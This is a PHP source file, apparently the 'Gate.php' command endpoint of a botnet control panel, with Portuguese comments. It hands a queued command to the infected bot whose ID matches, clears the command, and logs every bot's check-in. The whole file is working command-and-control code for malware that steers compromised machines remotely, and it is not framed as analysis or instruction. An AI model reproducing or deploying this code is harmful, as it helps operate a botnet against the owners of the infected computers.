<?php
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
// 129843585757.php / Gate.php ~~
//    Arquivo responsável por processar as conexões e os comandos enviados aos bots.
//
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	error_reporting(0);
	
	if (isset($_POST["829492"])) {
		
		$INICTL = parse_ini_file("databases/CTLCentral.ini", "CTLCTR");
		$UIDMST = $INICTL["CTLCTR"]["UID"];
		$CMDMST = $INICTL["CTLCTR"]["CMD"];
		$UIDB0T = $_POST["829492"];
		
		// Verifica se o comando é para está máquina...
		if (strcmp($CMDMST, "") != 0) {
			if (strcmp($UIDMST, "") != 0) {
				if (strcmp($UIDMST, $UIDB0T) == 0) {
					printf($CMDMST);
					
					// Limpa informações...
					$INFX = "[CTLCTR]\nUID=\nCMD=\n";
					$FileX = fopen("databases/CTLCentral.ini", "w");
					if ($FileX) {
						$WriteX = fwrite($FileX, $INFX);
						fclose($FileX);
					}
				}
			}
		}
		
		// Grava Log de acessos...
		$LogX = "UID: ". $UIDB0T ." - DATA: ". date("d/m/Y H:i:s ") . "\n";
		$FileY = fopen("modules/access_log/38459030495663598.txt", "a+");
		if ($FileY) {
			$WriteY = fwrite($FileY, $LogX);
			fclose($FileY);
		}
	}
	
// EOF  ~~ 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
?>
